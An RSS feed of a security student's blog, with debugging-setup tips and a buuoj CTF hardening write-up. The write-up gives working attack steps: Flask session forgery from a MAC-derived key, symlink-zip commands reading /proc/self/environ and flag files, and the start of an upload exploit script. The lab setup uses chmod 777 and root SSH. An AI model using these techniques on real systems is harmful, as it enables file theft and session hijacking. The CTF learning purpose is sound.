<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>LTS on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/categories/lts/</link><description>Recent content in LTS on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Thu, 13 Jan 2022 10:58:56 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/categories/lts/index.xml" rel="self" type="application/rss+xml"/><item><title>无题</title><link>https://amiaaaz.github.io/2022/01/13/maybe-help-someone/</link><pubDate>Thu, 13 Jan 2022 10:58:56 +0800</pubDate><guid>https://amiaaaz.github.io/2022/01/13/maybe-help-someone/</guid><description>&lt;details>
&lt;summary>
&lt;h4 class="inline">
本地搭建Visual Regexp
&lt;/h4>
&lt;/summary>
&lt;p>搭建原因大家应该都懂吧，一个是正则可视化实在是很香很必要，其次线下没网的话没有个离线工具就很容易gg，同类工具还有&lt;a href="https://github.com/gchq/CyberChef/releases/tag/v9.32.3">cyberchef&lt;/a>等&lt;/p>
&lt;p>&lt;a href="https://wangwl.net/static/projects/visualRegex/#">Visual Regexp在线地址&lt;/a> | &lt;a href="https://github.com/relax-code-relax-life/visualRegexPage">github仓库&lt;/a>&lt;/p>
&lt;p>在&lt;code>git clone&lt;/code>之后首先肯定是&lt;code>npm install&lt;/code>，出现vulnerabilities很正常，直接&lt;code>npm audit fix --force&lt;/code>，一次不行就两次&lt;/p>
&lt;p>奇葩的是作者自己的visual-regex包一直是以快捷方式的形式被安装（后来发现是整个项目的package.json编写的问题）&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211114182010887.png" alt="image-20211114182010887">&lt;/p>
&lt;p>解决方法：删除快捷方式，单独安装&lt;code>npm i visual-regex&lt;/code>，用everything查找到该包具体存在的位置，复制到node_modules目录下&lt;/p>
&lt;p>之后到build目录下&lt;code>node .\build.js&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211114182307150.png" alt="image-20211114182307150">&lt;/p>
&lt;p>报错hightlight.js并没有引入./lib/highlight，查看\highlight.js\package.json的exports部分，发现第90行的引用是&amp;quot;.&amp;quot;，将其改为&amp;quot;./lib/highlight&amp;quot;&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/JQW8B657%60%241JG%5BFOWY1I%7BBW.png" alt="img">&lt;/p>
&lt;p>再次build提示*&amp;lsquo;NODE_ENV&amp;rsquo; is not recognized as an internal or external command, operable program or batch file.*（此处截图走丢了），解决方法&lt;code>npm install -g win-node-env&lt;/code>&lt;/p>
&lt;p>之后&lt;code>node .\build.js&lt;/code>即可成功build，在devlist文件夹下的index.html即可正常使用相关功能&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
无法打开jar包应用
&lt;/h4>
&lt;/summary>
&lt;p>这个应该属于常见问题了，一般原因是java版本不对&lt;/p>
&lt;p>很多人选择设置不同名字的环境变量，比如java8，java11，我的话是只有java11是环境变量，在有些jar需要java8的环境时直接用everything搜索java.exe，复制路径之后&lt;code>xxx\java.exe -jar xyz.jar&lt;/code>这样来运行&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211117132839594.png" alt="image-20211117132839594">&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
远程调试Node.js
&lt;/h4>
&lt;/summary>
&lt;p>场景：用vulhub或其它已经打包好的docker环境复现cve需要远程调试&lt;/p>
&lt;p>首先修改对应的docker文件：package.json的&amp;quot;scripts&amp;quot;字段的&amp;quot;start&amp;quot;部分增加&lt;code>--inspect=0.0.0.0:port&lt;/code>，指名调试时的监听端口&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211117160017724.png" alt="image-20211117160017724">&lt;/p>
&lt;p>docker-compose.yml中增加监听端口&amp;quot;8000:9229&amp;quot;，之后正常&lt;code>docker-compose up -d&lt;/code>&lt;/p>
&lt;p>本地先下载好一样的文件，用vscode生成一个调试文档lauch.json&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211117155743006.png" alt="image-20211117155743006">&lt;/p>
&lt;p>需要改的配置有address（远程ip），port（远程监听端口），localRoot（本地路径），remote（远程路径），之后即可打断点调试&lt;/p>
&lt;p>出现unbound breakpoint正常，大概率是你的交互就没执行到打断点的地方，所以没什么反应&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
VirtualBox给虚拟机磁盘扩容
&lt;/h4>
&lt;/summary>
&lt;p>当初给kali只分配了16G（无奈啊，谁让我主机也就512，得省着用），导致今天pip一个包都失败&lt;/p>
&lt;p>之后我直接用自带的主机介质管理器增加盘片的大小&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220113110156096.png" alt="image-20220113110156096">&lt;/p>
&lt;p>当我把下面显示大小的条滑到24G的时候我觉得稳了，这还能不够用？？？于是自信开机&lt;/p>
&lt;p>笑死，GParted没识别出来，&lt;code>df -h&lt;/code>也完全没变化，我就又多分配了4G，结果裂开，还是没识别&lt;/p>
&lt;p>然后我发现问题在于快照的存储是单独有一个uuid的vdi的，而扩容时我选择在最上层的kali.vdi扩容，导致不会同步到下面的快照的存储信息&lt;/p>
&lt;p>解决方法就是把前面所有的快照删除掉，之后再开机就可以识别了&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220113112010762.png" alt="image-20220113112010762">&lt;/p>
&lt;p>由于未分配和/dev/sda1之间隔着扩展分区和swap，所以先删除这两个，扩容后再新建加回来&lt;/p>
&lt;p>应用修改之后自信开机，发现怎么kali的龙半天都不蓝…… 一番排错，之后发现是因为swap分区的uuid发生改变导致swap没有正常挂载（&lt;code>swapon --show&lt;/code>回显为空）&lt;/p>
&lt;p>输入&lt;code>blkid&lt;/code>复制/dev/sda5的uuid，将其复制粘贴到/etc/fstab的对应位置，就好啦&lt;/p>
&lt;/details></description></item><item><title>PHP远程debug环境配置</title><link>https://amiaaaz.github.io/2021/11/25/php-remote-debug-env-init/</link><pubDate>Thu, 25 Nov 2021 18:44:34 +0800</pubDate><guid>https://amiaaaz.github.io/2021/11/25/php-remote-debug-env-init/</guid><description>&lt;p>首先，这里的情况与一般的本地调试localhost不同，是本地debug远程主机的docke内的php项目，也就是这里的laravel；可能有的人觉得多此一举，直接在本地搭建项目、运行、debug一气呵成，速度还快，何必到远程跑一通？那我只能说too young，年轻人还是要有点长远的打算（&lt;/p>
&lt;p>一切的起因是我想复现cve-2021-3129，顺便亲自动手跟一跟&amp;amp;挖一挖laravel框架反序列化的链子，结果代码审计之前先被环境配置困住了；被这个糟心的调试从周二下午折磨到周四的凌晨，几乎是把能踩的坑踩了个遍（痛苦面具），直到现在的解决方案也不能算是最优解，不过是能正常稳定的跑起来了，次优解；感谢portainer让我能轻松创建docker&lt;/p>
&lt;p>把详细的步骤记录到这篇博客里，希望可以帮助到看到的人~欢迎友好交流！&lt;/p>
&lt;hr>
&lt;p>先说下本次配置的环境整体需求吧：&lt;/p>
&lt;ul>
&lt;li>远程vps的docker(FROM php:7.4-apache): 需开放web页面端口 + ssh端口（无需挂载目录&lt;/li>
&lt;li>laravel 8.4.2, laravel/framework 8.22.1, facade/ignition 2.5.1&lt;/li>
&lt;li>本地ide: PHPStorm + 一个映射到公网ip的供调试连接使用的端口（后面会解释原因）&lt;/li>
&lt;/ul>
&lt;p>除了最后的laravel之外就都是调php的通用流程啦，让我们开始吧~&lt;/p>
&lt;h2 id="远程dockerlaravel的环境搭建">远程docker&amp;amp;laravel的环境搭建&lt;/h2>
&lt;p>以php:7.4-apache镜像作为基础进行创建，我这里用的是portainer（别问为什么不写dockerfile，问就是还在学着怎么写（一定不鸽 近期会更新到这里的&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125164513693.png" alt="image-20211125164513693">&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">apt update
apt-get install -y ssh git unzip
vim /etc/ssh/sshd_config &lt;span style="color:#75715e"># 开启对应选项 比如允许root连接什么的 不用我细嗦 各位带手子们都应该懂&lt;/span>
pecl install xdebug
touch /var/log/php/xdebug_remote.log &lt;span style="color:#75715e"># 如果需要log的话要提前创建好噢&lt;/span>
vim /usr/local/etc/php/php.ini &lt;span style="color:#75715e"># 将下面框中内容粘到末尾即可&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-ini" data-lang="ini">&lt;span style="color:#00a8c8">[Xdebug]&lt;/span>
&lt;span style="color:#75715e">; 这一项安装好之后会有提示&lt;/span>
&lt;span style="color:#75af00">zend_extension&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;/usr/local/lib/php/extensions/no-debug-non-zts-20190902/xdebug.so&amp;#34;&lt;/span>
&lt;span style="color:#75af00">xdebug.mode&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">debug&lt;/span>
&lt;span style="color:#75af00">xdebug.client_host&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">your_vps&lt;/span>
&lt;span style="color:#75af00">xdebug.client_port&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">port&lt;/span>
&lt;span style="color:#75af00">xdebug.idekey&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">laravel&lt;/span>
&lt;span style="color:#75af00">xdebug.remote_handler&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;dbgp&amp;#34;&lt;/span>
&lt;span style="color:#75af00">xdebug.log&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;/var/log/php/xdebug_remote.log&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>此处安装版本为xdebug3，与xdebug2的配置语法有一些出入，具体更新的内容详见&lt;a href="https://xdebug.org/docs/upgrade_guide">更新文档&lt;/a>，安装好xdebug后执行&lt;code>php -v&lt;/code>命令会有显示版本&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125164949111.png" alt="image-20211125164949111">&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">wget https://github.com/composer/composer/releases/download/2.1.12/composer.phar
mv composer.phar /usr/local/bin/composer
chmod +x /usr/local/bin/composer
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#111">cd&lt;/span> /var/www
composer create-project laravel/laravel . &lt;span style="color:#d88200">&amp;#34;v8.4.2&amp;#34;&lt;/span>
vim composer.json &lt;span style="color:#75715e"># 修改内容见下&lt;/span>
composer update
mv public html
chmod -R &lt;span style="color:#ae81ff">777&lt;/span> /var/www
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-ini" data-lang="ini">&lt;span style="color:#75af00">&amp;#34;laravel/framework&amp;#34;: &amp;#34;8.22.1&amp;#34;&lt;/span>
&lt;span style="color:#75af00">&amp;#34;facade/ignition&amp;#34;: &amp;#34;2.5.1&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>一个坑点：即使指定了&lt;a href="laravel/laravel">laravel/laravel&lt;/a>版本，composer创建默认会使用最新的&lt;a href="laravel/framework">laravel/framework&lt;/a>版本&amp;amp;相关组件依赖（比如现在是8.73.2），由于我们需要复现的cve有特殊的laravel组件版本需求，，所以我们需要单独对composer.json进行修改，然后执行&lt;code>composer update&lt;/code>进行更新&lt;/p>
&lt;p>一切顺利的话访问web页面就可以看到laravel啦&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125165355843.png" alt="image-20211125165355843">&lt;/p>
&lt;h2 id="与本地的phpstorm连接起来进行debug">与本地的PHPStorm连接起来进行debug&lt;/h2>
&lt;p>开始之前先自问自答一下：为什么调试要一个能映射到公网的端口？&lt;/p>
&lt;p>PHPStorm中集成了遵循DBGp协议的Xdebug插件，当开启监听时会监听本地指定端口，当访问指定server的web页面并带有含有ide_key的特定cookie参数之后，Xdebug会接收到这个参数并开启debug，通过DBGp协议向php.ini中指定的ip&amp;amp;port发送请求，当这个port指向我们ide在监听的端口时，就会建立起Xdebug和ide的连接（使用DBGp协议通讯），随后它们之间进行数据交互，如此反复；更详细的内容请参见-&amp;gt;&lt;a href="https://xdebug.org/docs/dbgp#id32">6.3 IDE to debugger engine communications&lt;/a>&lt;/p>
&lt;p>这下就好理解了叭？也就是说，需要一个与远程代码运行环境处在同一个网段下的端口（公网的更好）；接下来就是配置啦&lt;/p>
&lt;h3 id="内网穿透">内网穿透&lt;/h3>
&lt;p>内网穿透我使用的是nps，配置过程可以参考&lt;a href="https://ehang-io.github.io/nps/#/run">官方文档&lt;/a>，由于我这里配的比较早 这部分跳过&lt;/p>
&lt;h3 id="phpstorm的设置有一堆">PHPStorm的设置有一堆&lt;/h3>
&lt;p>把docker中/www目录打包拖下来，用PHPStorm打开&lt;/p>
&lt;h4 id="设置debug">设置Debug&lt;/h4>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125172830540.png" alt="image-20211125172830540">&lt;/p>
&lt;p>20007是本地端口，被映射到公网ip&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125172903465.png" alt="image-20211125172903465">&lt;/p>
&lt;p>这里的20007是公网端口，代理本地的20007&lt;/p>
&lt;p>如果我讲清楚前面原理的话，大家应该能理解这两个地方的端口设置二选一即可&lt;/p>
&lt;h4 id="设置deployment">设置Deployment&lt;/h4>
&lt;p>用SFTP与docker进行ssh连接，文件映射&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125174439189.png" alt="image-20211125174439189">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125174449223.png" alt="image-20211125174449223">&lt;/p>
&lt;h4 id="设置远程php解释器">设置远程php解释器&lt;/h4>
&lt;p>选择ssh模式，配一下账号密码端口就行（至于为什么不用docker/docker-compose，之后会说），这里的Path mappings直接就是Deployment中配好的，可以单独再加，但是没必要&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125173731219.png" alt="image-20211125173731219">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125174004041.png" alt="image-20211125174004041">&lt;/p>
&lt;h4 id="设置server">设置Server&lt;/h4>
&lt;p>注意高亮地方的设置，是web页面的端口，也要设置好本地的路径映射&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125173454167.png" alt="image-20211125173454167">&lt;/p>
&lt;h3 id="验证一下联通情况">验证一下联通情况&lt;/h3>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125175835232.png" alt="image-20211125175835232">&lt;/p>
&lt;p>好耶~&lt;/p>
&lt;h3 id="浏览器插件xdebug-helper">浏览器插件Xdebug helper&lt;/h3>
&lt;p>设置Debug Configuration，选PHP Remote Debug模式&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125175154353.png" alt="image-20211125175154353">&lt;/p>
&lt;p>安装插件，设置ide_key，开启小虫子&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125180035074.png" alt="image-20211125180035074">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125180424620.png" alt="image-20211125180424620">&lt;/p>
&lt;h2 id="终于完了">终于完了&lt;/h2>
&lt;p>随便打个断点，开启本地监听&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125180223037.png" alt="image-20211125180223037">&lt;/p>
&lt;p>刷新页面&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125180453865.png" alt="image-20211125180453865">&lt;/p>
&lt;p>芜湖起飞！&lt;/p>
&lt;h2 id="待完善的地方">***待完善的地方&lt;/h2>
&lt;ul>
&lt;li>配置远程php解释器可以使用docker/docker-compose，这两个都需要单独挂载关键目录出来，配置上与ssh的区别还是有点大的，也需要注意docker-compose文件的编写，先扔一个参考资料-&amp;gt;&lt;a href="https://www.pascallandau.com/blog/setup-phpstorm-with-xdebug-on-docker/#setup-the-docker-containers">Setting up PhpStorm with Xdebug for local development on Docker &amp;hellip; natively and via Deployment Configuration.&lt;/a>&lt;/li>
&lt;li>关于dockerfile/docker-compose文件的编写，我还不是很熟练，跟不用说这样的php项目了，同样先扔一个参考资料-&amp;gt;&lt;a href="https://www.pascallandau.com/blog/structuring-the-docker-setup-for-php-projects/">Structuring the Docker setup for PHP Projects &amp;hellip; folder structure, Dockerfile templates and general fundamentals&lt;/a>&lt;/li>
&lt;li>PHPStorm有内置的docker管理功能，可以创建镜像-&amp;gt;配置debug一步到位&lt;/li>
&lt;/ul>
&lt;hr>
&lt;p>虽然踩了很多坑，但是也学到了不少东西，希望能多少帮助一些人少走弯路（&lt;/p>
&lt;p>限于篇幅原因，代码审计的部分就放到后面啦~&lt;/p>
&lt;p>最近更新的不太勤快，我先自我批评TAT，已经很菜了不能再不努力啊啊啊啊啊啊啊啊&lt;/p></description></item><item><title>buuoj加固题 Wp</title><link>https://amiaaaz.github.io/2021/11/07/buuoj-fixchalls-wp/</link><pubDate>Sun, 07 Nov 2021 08:57:29 +0800</pubDate><guid>https://amiaaaz.github.io/2021/11/07/buuoj-fixchalls-wp/</guid><description>&lt;p>buuoj新上了加固题这个分类，也就是线下awdp中fix的部分，只要将靶机中存在的漏洞修复好并通过check的检测即可拿到flag；有一说一，比单纯attack拿flag会简单很多（适合我这种沸物web&lt;/p>
&lt;p>下面的wp会先说纯修复角度，再串一下整体的知识点；因为自己水平有限，想尽可能说的清楚一些就会比较啰嗦，见谅QAQ&lt;/p>
&lt;h2 id="ezsql">Ezsql&lt;/h2>
&lt;h3 id="fix">FIX&lt;/h3>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211107083450780.png" alt="image-20211107083450780">&lt;/p>
&lt;p>200行，太典了，对传入的参数完全没有检测，是个筛子；用预处理的方式修，又可以分为两种形式&lt;/p>
&lt;h3 id="mysql预处理">mysql预处理&lt;/h3>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211107083655664.png" alt="image-20211107083655664">&lt;/p>
&lt;p>其中201行的&lt;code>ss&lt;/code>指的是绑定SQL参数的类型为string，这一项必不可少而且必须与后面的参数一一对应&lt;/p>
&lt;h3 id="pdo预处理">PDO预处理&lt;/h3>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211107084309239.png" alt="image-20211107084309239">&lt;/p>
&lt;p>PDO预处理属于是通防了，能有效地应对sqli特别是堆叠注入，208行的设置项意为禁用模拟预处理&lt;/p>
&lt;h2 id="ciscn2021-总决赛babypython">[CISCN2021 总决赛]babypython&lt;/h2>
&lt;h3 id="fix-1">FIX&lt;/h3>
&lt;p>ssh连上后看下目录结构&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106212456961.png" alt="image-20211106212456961">&lt;/p>
&lt;p>查看/app/y0u_found_it/y0u_found_it_main.py&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106212556547.png" alt="image-20211106212556547">&lt;/p>
&lt;p>11行这不是典中典了？读mac地址就打通了，所以我们直接把SECRET_KEY改为一个又长又乱的随机字符串即可，可以使用&lt;a href="uuid/guid%E7%94%9F%E6%88%90%E5%99%A8">uuid/guid生成器&lt;/a>来生成&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106210732859.png" alt="image-20211106210732859">&lt;/p>
&lt;blockquote>
&lt;p>————碎碎念：这里修复的时候可能看脸？我在几天前试的时候用的一模一样的方法，但是怎么都不能过check，今天试了一次就可以了，但是在写wp的时候再复盘就又不可以了……emmm 可能还是哪里的细节出了错但是我没有注意到？给我整不会了属于是&lt;/p>
&lt;/blockquote>
&lt;h3 id="关于本题">关于本题&lt;/h3>
&lt;p>是个原题，还是个有了包浆的原题，参见-&amp;gt;&lt;strong>&lt;a href="https://buuoj.cn/challenges#%5BHCTF%202018%5DHideandseek">[HCTF 2018]Hideandseek&lt;/a>&lt;/strong> | &lt;strong>&lt;a href="https://buuoj.cn/challenges#%5BSWPU2019%5DWeb3">[SWPU2019]Web3&lt;/a>&lt;/strong>，做过的就知道这他妈真的就一模一样hhhhhhhh&lt;/p>
&lt;p>考点在于linux软链接+uuid+flask-session伪造，后者还经常单独出题，比如 &lt;strong>&lt;a href="https://buuoj.cn/challenges#%5BCISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DWeb4">[CISCN2019 华东南赛区]Web4&lt;/a>&lt;/strong>，都快烤烂了&lt;/p>
&lt;h3 id="考点一--uuidsecret_key">考点一 · uuid&amp;amp;SECRET_KEY&lt;/h3>
&lt;p>SECRET_KEY通过uuid+伪随机数的方式生成，这个考点可以参考 &lt;strong>&lt;a href="https://buuoj.cn/challenges#%5BCISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DWeb4">[CISCN2019 华东南赛区]Web4&lt;/a>&lt;/strong>，其中app.py是这样写的&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106212834438.png" alt="image-20211106212834438">&lt;/p>
&lt;p>&lt;code>uuid.getnode()&lt;/code>会以48位二进制长度的正整数形式返回mac地址，linux下mac地址的位置在&lt;code>/sys/class/net/eth0/address&lt;/code>，读出mac地址后我们也来生成一波伪随机数&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210707204313712.png" alt="image-20210707204313712">&lt;/p>
&lt;p>之后通过flask-session-cookie-manager一把梭即可伪造session值&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210707204240633.png" alt="image-20210707204240633">&lt;/p>
&lt;p>————另外，通常访问不存在目录时SECRET_KEY会出现在请求头中&lt;/p>
&lt;h3 id="考点二--linux软链接文件读取zip压缩包">考点二 · linux软链接文件读取&amp;amp;zip压缩包&lt;/h3>
&lt;p>ln -s是linux中的软链接命令，我们可以制作对应文件的绝对路径的软链接来读文件；当不知道flask工作目录可以使用&lt;code>/proc/self/cwd&lt;/code>来指向当前进程的目录&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">ln -s /proc/self/cwd/flag/flag/.jpg qwe
&lt;/code>&lt;/pre>&lt;/div>&lt;p>或者通过&lt;code>/proc/self/environ&lt;/code>文件里包含进程的环境变量，可以从中获取flask的绝对路径，再制作软链接（关于/proc的更多信息可以参见-&amp;gt;&lt;a href="https://amiaaaz.github.io/proc%E7%9B%AE%E5%BD%95%E7%9A%84%E5%A6%99%E7%94%A8">/proc目录的妙用&lt;/a> | &lt;a href="https://bbs.zkaq.cn/t/3639.html">LFItoRCE利用总结&lt;/a>，题-&amp;gt;&lt;a href="https://buuoj.cn/challenges#%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E7%99%BD%E8%99%8E%E7%BB%84%5DPicDown">[网鼎杯 2020 白虎组]PicDown&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">ln -s /proc/self/environ qwe
&lt;/code>&lt;/pre>&lt;/div>&lt;p>而对于目录内文件的列举也是有方法的，参见-&amp;gt;&lt;a href="https://blog.csdn.net/keyball123/article/details/105169946">34C3 CTF Web题 extract0r Writeup&lt;/a>&lt;/p>
&lt;p>甚至也可以写入shell，参见-&amp;gt;&lt;a href="https://mp.weixin.qq.com/s/NvItuko9ZAUNTJaSzBpNKw">[深育杯 2021]Zipzip&lt;/a>&lt;/p>
&lt;p>制作好的软链接通过zip打包&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">zip -ry qwe.zip qwe
&lt;/code>&lt;/pre>&lt;/div>&lt;p>更多题目中的应用可以参见-&amp;gt;&lt;a href="http://redteam.today/2018/01/20/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93%E9%A2%98%E7%9A%84%E5%A4%9A%E7%A7%8D%E8%A7%A3%E6%B3%95/">记录一道题的多种解法&lt;/a>&lt;/p>
&lt;p>关于这个漏洞的实际应用可以参见-&amp;gt;&lt;a href="https://paper.seebug.org/104/">GitLab 任意文件读取漏洞 (CVE-2016-9086) 和任意用户 token 泄露漏洞&lt;/a>&lt;/p>
&lt;h3 id="attack">*ATTACK&lt;/h3>
&lt;p>exp.py - 1 生成软链接&amp;amp;zip&amp;amp;自动上传&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">sys&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://0a716e50-1cf2-4cd8-a00f-b70d9987ed64.node3.buuoj.cn/upload&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">makezip&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;ln -s &amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#39; exp&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># os.system(&amp;#39;zip --symlinks exp.zip exp&amp;#39;)&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;zip -ry exp.zip exp&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">makezip&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">files&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#39;the_file&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>&lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;./exp.zip&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;rb&amp;#39;&lt;/span>&lt;span style="color:#111">)}&lt;/span>
